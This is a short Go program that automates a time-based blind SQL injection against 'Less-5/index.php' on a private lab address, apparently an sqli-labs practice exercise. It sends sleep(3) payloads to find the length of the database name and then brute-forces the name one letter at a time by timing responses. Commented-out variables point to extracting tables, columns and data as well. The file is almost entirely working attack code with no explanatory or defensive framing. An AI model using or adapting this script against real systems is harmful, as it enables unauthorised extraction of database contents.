package main

import (
	"fmt"
	"log"
	"net/http"
	"strconv"
	"time"
)

var letters map[int]string = make(map[int]string)
var cost bool = false

func main() {
	stringDb := "" // database
	/*stringTb := "" // tables
	stringCl := "" // columns
	stringDa := "" // columns data
	chanDB := make(chan string)*/
	letter()
	Length := 0
	for i := 3; i < 50; i++ {
		url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(length(database())=%27" + strconv.Itoa(i) + "%27,sleep(3),1)%20--%20d"
		payload(url)
		if cost {
			Length = i
		}
	}
re:
	for i := 1; i <= Length; i++ {
		for _, letter := range letters {
			str := stringDb
			str += letter
			url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(left(database()," + strconv.Itoa(i) + ")=%27" + str + "%27,sleep(3),1)%20--%20d"
			payload(url)
			if cost {
				stringDb += letter
				continue re
			}
		}
	}

	fmt.Println("databaseName:" + stringDb)
}

func letter() {
	for i := 97; i < 123; i++ {
		letters[i] = string(i)
	}
}

func payload(url string) {
	defer timeCost()()
	respDataBase, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	}
	respDataBase.Body.Close()
}
func timeCost() func() {
	start := time.Now()
	return func() {
		tc := time.Since(start)
		second := tc.Seconds()
		if second < float64(3) {
			cost = false
		} else {
			cost = true
		}
	}
}
